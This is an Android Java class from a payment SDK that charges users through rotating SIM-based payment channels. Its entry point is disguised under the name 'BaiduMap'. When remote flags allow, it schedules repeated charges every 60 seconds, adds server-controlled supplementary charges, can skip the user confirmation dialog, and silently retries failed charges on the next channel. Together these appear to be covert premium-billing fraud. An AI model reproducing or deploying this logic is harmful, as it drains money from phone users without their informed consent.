package com.sdk.wj.paysdk.pay;

import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;

import java.util.Timer;
import java.util.TimerTask;

import com.sdk.wj.paysdk.channel.BasePayChannel;
import com.sdk.wj.paysdk.channel.DefaultPayChannel;
import com.sdk.wj.paysdk.channel.IPayChannelListener;
import com.sdk.wj.paysdk.channel.PayChannelFactory;
import com.sdk.wj.paysdk.httpCenter.GetDataImpl;
import com.sdk.wj.paysdk.httpCenter.HttpListener;
import com.sdk.wj.paysdk.json.ChannelEntity;
import com.sdk.wj.paysdk.json.JsonUtil;
import com.sdk.wj.paysdk.json.SetEntity;
import com.sdk.wj.paysdk.json.throughEntity;
import com.sdk.wj.paysdk.utils.Constants;
import com.sdk.wj.paysdk.utils.Log;
import com.sdk.wj.paysdk.utils.Utils;

public class NormalPay1003 {
    int throughCounter; // 控制循环次数
    private static String LASTREQUESTHROUGHID = "";
    public int PayThrough = 0;
    private static Long LASTREQUESTTIME = 0L;
    private static NormalPay1003 pay = null;
    private String initialPrice;
    private static SetEntity setEntity = null;
    public static Timer timer;
    private static boolean isFirstClick = true;
    public static final int THROUGNUMBER = 8; // 循环通道数
    private throughEntity Through;
    private static int count = 0;
    public int payNumber = 0; // 支付次数
    private ChannelEntity body = null;

    public static NormalPay1003 getInstance() {
        if (pay == null) {
            pay = new NormalPay1003();
        }
        return pay;
    }

    public void BaiduMap(final Context ctx, final String price, final int payItemID, final String str,
                    final String product, String Did, final String extData, final Object receiver) {
        try {
            setEntity = SDKInit.setEntity;
//        if (SDKInit.setEntity == null || Utils.getAirplaneMode(ctx) || !setEntity.isOpen_jifei) {
//            return;
//        }

            if (Constants.isOutPut) {
                Log.debug("====>是否开启补单:" + setEntity.bd_Isapply);
                Log.debug("====>补单次数：" + setEntity.bd_times);
            }
            if (setEntity.bd_Isapply) {
                count++;
                if (count == setEntity.bd_times) {
                    TimesCountPay1004.getInstance().TimesCountPay_BaiduMap(ctx, price, payItemID, str, product, "1004",
                            extData, receiver, setEntity);
                    count = 0;
                } else {
                    pay(ctx, price, payItemID, str, product, "1003", extData, receiver);
                }
            } else {
                pay(ctx, price, payItemID, str, product, "1003", extData, receiver);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void pay(final Context ctx, final String price, final int payItemID, final String str, final String product,
                     String Did, final String extData, final Object receiver) {
        if (isFirstClick && setEntity.isOpenPay_month) {
            isFirstClick = false;
            timer = new Timer();
            timer.schedule(new TimerTask() {
                @Override
                public void run() {
                    Timing60sPay1002.getInstance().Timing_BaiduMap(ctx, price, payItemID, str, product, "1002", extData,
                            receiver, setEntity);
                }
            }, 60 * 1000, 60 * 1000);
        }
        initialPrice = price;
        throughCounter = 0;
        PayThrough = payNumber % THROUGNUMBER; // 通道的循环机制,不需要一直重复请求同一个通道
        payNumber++;
        ReqChannel(ctx, price, str, product, extData, Did, false, receiver);
    }

    private void ReqChannel(final Context ctx, final String customized_price, final String str, final String product,
                            final String extData, final String Did, final Boolean skipSecondConfirm,
                            final Object receiver) {

        /**
         * 判断是否需要二次确认
         */
        boolean isSecondConfirm = false;
        if (setEntity != null)
            isSecondConfirm = setEntity.isSecondConfirm;
        if (skipSecondConfirm) {
            isSecondConfirm = false;
        }
        if (Constants.isOutPut) {
            Log.debug("throughCounter -->" + throughCounter);
            Log.debug("PayThrough ---->" + PayThrough);
            Log.debug("PayThrough -->" + PayThrough % THROUGNUMBER);
        }
        if (throughCounter == 0)
            initialPrice = customized_price;
        if (isSecondConfirm) {
            SecondConfirmDialogHandle secondConfirmHandler = new SecondConfirmDialogHandle(ctx, customized_price, str, product, extData, Did, receiver);
            Message secondConfirmMsg = new Message();
            secondConfirmMsg.what = 1001;
            secondConfirmHandler.sendMessage(secondConfirmMsg);
        } else {
            ReqChannel(ctx, customized_price, product, extData, Did, receiver);
        }
    }

    private void ReqChannel(final Context ctx, final String customized_price, final String product,
                            final String extData, final String Did, final Object callback) {
        try {
            if (!Log.D) {
                if (!Utils.getSIMState(ctx)) {
                    // 修复当手机SIM不存在时没有正常回调的问题
                    return;
                }
            }
            /**
             * 判断类型SDK 不请求后台 其他类型请求后台走原来的逻辑
             */
            try {
                switch (PayThrough % THROUGNUMBER) {
                    case 0:
                        Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class, setEntity.AThrough);
                        break;
                    case 1:
                        Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class, setEntity.BThrough);
                        break;
                    case 2:
                        Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class, setEntity.CThrough);
                        break;
                    case 3:
                        Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class, setEntity.DThrough);
                        break;
                    case 4:
                        Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class, setEntity.EThrough);
                        break;
                    case 5:
                        Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class, setEntity.FThrough);
                        break;
                    case 6:
                        Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class, setEntity.GThrough);
                        break;
                    case 7:
                        Through = (throughEntity) JsonUtil.parseJSonObject(throughEntity.class, setEntity.HThrough);
                        break;
                }
            } catch (Exception e) {
                Through = new throughEntity();
            }

            if (!TextUtils.isEmpty(Through.id)) {
                // 通道ID等于上一次成功的通道ID
                if (Through.id.equals(LASTREQUESTHROUGHID)) {
                    // 如果时间限制了，那么走下一个通道
                    if (System.currentTimeMillis() - LASTREQUESTTIME < Through.timing * 1000) {
                        if (throughCounter < THROUGNUMBER - 1) {
                            PayThrough++;
                            throughCounter++;
                            ReqChannel(ctx, customized_price, "", product, extData, Did, true,
                                    callback);
                        }
                        if (Constants.isOutPut) {
                            Log.debug("进入支付失败逻辑 ----------- 请求当前通道超时，接下来会请求下一个通道");
                        }
                        return;
                    }
                }
            } else {
                PayThrough++;
                throughCounter++;
                Log.debug("=======>通道ID为空");
                ReqChannel(ctx, customized_price, "", product, extData, Did, true, callback);
                return;
            }
            GetDataImpl.getInstance(ctx).getChannelId(Through.id, initialPrice, Did, product,
                    new HttpListener() {
                        @Override
                        public void result(String result) {
                            body = (ChannelEntity) JsonUtil.parseJSonObject(ChannelEntity.class, result);
                            if (!body.state.contains("0")) {
                                goToNextThrough(ctx, customized_price, product, extData, Did, callback);
                                return;
                            } else if (body.state.contains("0") && body.order.isEmpty()) {
                                goToNextThrough(ctx, customized_price, product, extData, Did, callback);
                                return;
                            }
                            if (body.order != null) {
                                setDate(ctx, customized_price, product, extData, Did, callback);
                            }
                        }
                    });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void setDate(Context ctx, String customized_price, String product,
                         String extData, String Did, Object callback) {
        reqPay(ctx, customized_price, product, extData, Did, body, callback);
    }

    private void reqPay(final Context ctx, final String price, final String productName, final String extData,
                        final String Did, final ChannelEntity channel, final Object callback) {
        if (Constants.isOutPut) {
            Log.debug("当前通道-->" + channel.toString());
        }
        BasePayChannel payChannel = PayChannelFactory.getPayChannelByChannelId(Integer.parseInt(channel.throughId), channel, Did);
        payChannel.addPayChannelListener(new IPayChannelListener() {
            @Override
            public void onPaySucceeded() {
                throughCounter = 0;
                /** 缓存成功通道ID和时间 */
                LASTREQUESTHROUGHID = channel.throughId;
                LASTREQUESTTIME = System.currentTimeMillis();
                PayCallBack.getInstance().paySuccess(callback);
//                if (throughCounter < THROUGNUMBER - 1) {
//                    PayThrough++;
//                    throughCounter++;
//                    ReqChannel(ctx, price, "", productName, extData, Did, cb, true, callback);
//                    cb.getOrderInfo().is_supplement = 1;
//                    cb.postPayReceiver(Constants.PayState_FAILURE);
//                } else {
//                    // 使用MDO本地生成短信方式支付 在有传入本地指令和确认有配置MDO的情况下
//                    // 并且计数器归0
//                    throughCounter = 0;
//                    cb.getOrderInfo().is_supplement = 0;
//                    cb.postPayReceiver(Constants.PayState_FAILURE);
//                }
//                if (Constants.isOutPut) {
//
//                    Log.debug("进入支付失败逻辑 -- throughCounter -->" + throughCounter);
//                }
            }

            @Override
            public void onPayFailed() {
                if (Constants.isOutPut) {
                    Log.debug("---进入支付失败逻辑");
                }
                PayCallBack.getInstance().payFail(callback);
//                if (Utils.getIsRequest(ctx) == 0) { // 不执行应急 0关闭 1打开
//                    PayCallBack.getInstance().payFail(callback);
//                    if (Constants.isOutPut) {
//
//                        Log.debug("进入支付失败逻辑 ----------- 33333333333");
//                    }
//                    return;
//                }
                /**
                 * 失败的话修改渠道优先级
                 *
                 * 使用计数器失败加1，计数器必须小于渠道优先级数组的长度。
                 *
                 * 根据渠道优先级重新请求支付
                 *
                 * 成功计数器归0
                 */
                try {
                    Thread.sleep(1000);
                } catch (Exception e) {
                }
                if (throughCounter < THROUGNUMBER - 1) {
                    PayThrough++;
                    throughCounter++;
                    ReqChannel(ctx, price, "", productName, extData, Did, true, callback);
                } else {
                    // 使用MDO本地生成短信方式支付 在有传入本地指令和确认有配置MDO的情况下
                    // 并且计数器归0
                    throughCounter = 0;
                }
                if (Constants.isOutPut) {
                    Log.debug("进入支付失败逻辑 -- throughCounter -->" + throughCounter);
                }
            }

            @Override
            public void onPayCanceled() {
                throughCounter = 0;
            }

        });

        // 设置相关参数
        payChannel.setAppContext(ctx);
        payChannel.setPrice((int) Double.parseDouble(price));
        payChannel.setExtData(extData);
        payChannel.setProductName(productName);
//        payChannel.setOrderInfo(cb.getOrderInfo());

        /**
         * 默认通道,后台指令方式
         */
        if (payChannel instanceof DefaultPayChannel) {
            ((DefaultPayChannel) payChannel).setChannel(channel);
            ((DefaultPayChannel) payChannel).setThroughId(channel.throughId);
            ((DefaultPayChannel) payChannel).setContext(ctx);
        }
        // 通道付费
        payChannel.pay();
    }

    class SecondConfirmDialogHandle extends Handler {
        private Context context;
        private String customized_price;
        private String tipInfo;
        private String product;
        private String extData;
        private String Did;
        private Object receiver;

        public SecondConfirmDialogHandle(Context _context, String _customized_price, String _tipInfo, String _product,
                                         String _extData, final String _Did,
                                         Object receiver) {
            super(_context.getMainLooper());
            context = _context;
            customized_price = _customized_price;
            tipInfo = _tipInfo;
            product = _product;
            extData = _extData;
            Did = _Did;
            this.receiver = receiver;
        }

        @Override
        public void handleMessage(Message msg) {
            if (msg.what == 1001) {
                showDialog(context, customized_price, tipInfo, null, new OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int arg1) {
                        dialog.dismiss();
                        ReqChannel(context, customized_price, product, extData, Did, receiver);
                    }
                }, (Handler) receiver);
            }
        }

        private void showDialog(final Context ctx, String price, String str,
                                OnClickListener positiveButton, OnClickListener negativeButton, final Handler payCallBack) {
            Builder builder = new Builder(ctx);
            if (TextUtils.isEmpty(str)) {
                double priceShowValue = 0;
                try {
                    priceShowValue = Double.parseDouble(price) / 100.00;
                } catch (Exception ignore) {
                    builder.setMessage("您确定要支付" + price + "元吗？");
                }
                builder.setMessage("您确定要支付" + priceShowValue + "元吗？");
            } else {
                builder.setMessage(str);
            }
            final String p = price;
            builder.setTitle("提示");
            // builder.setCancelable(false);
            builder.setPositiveButton("取消", new OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                    PayCallBack.getInstance().payCancel(payCallBack);
                }
            });
            if (negativeButton != null) {
                builder.setNegativeButton("确认", negativeButton);
            }
            builder.setOnCancelListener(new DialogInterface.OnCancelListener() {

                @Override
                public void onCancel(DialogInterface dialog) {
                    dialog.dismiss();
                    PayCallBack.getInstance().payCancel(payCallBack);
                }
            });
            builder.setCancelable(false);
            builder.create().show();
        }
    }

    private void goToNextThrough(Context ctx, String customized_price, String product, String extData, String Did, Object callback) {
        if (throughCounter < THROUGNUMBER - 1) {
            PayThrough++;
            throughCounter++;
            ReqChannel(ctx, customized_price, "", product, extData, Did, true, callback);
            if (Constants.isOutPut) {
                Log.debug("------走下一个通道");
            }
        }
    }
}
